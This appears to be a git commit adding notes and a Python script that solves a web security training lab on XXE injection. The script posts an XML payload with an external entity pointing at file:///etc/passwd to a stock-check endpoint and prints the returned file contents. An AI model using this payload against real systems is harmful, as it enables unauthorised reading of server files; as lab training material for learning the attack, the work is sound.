2db5924a42e0aeb08201233a465f0e442a8bdcce
Rana Khalil <ranakhalil101@gmail.com>
2023-02-04 01:51:01 -0500

    Add files via upload

---
+++ xxe-injection/lab-01/notes.txt
@@ -0,0 +1,6 @@
+Lab 1 - Exploiting XXE using external entities to retrieve files
+
+Target Goal - Exploit XXE injection to retrieve the contents of the /etc/passwd file.
+
+Analysis:
+
---
+++ xxe-injection/lab-01/xxe-injection-lab-01.py
@@ -0,0 +1,29 @@
+import requests
+import sys
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def exploit_xxe(s, url):
+
+    print("(+) Exploiting XXE Injection...")
+    stock_url = url + '/product/stock'
+    data_stock = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>'
+    r = s.post(stock_url, data=data_stock, verify=False, proxies=proxies)
+    print("(+) The following is the content of the /etc/passwd file: ")
+    print(r.text)
+
+def main():
+    if len(sys.argv) !=2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    s = requests.Session()
+    url = sys.argv[1]
+    exploit_xxe(s, url)
+
+if __name__ == "__main__":
+    main()
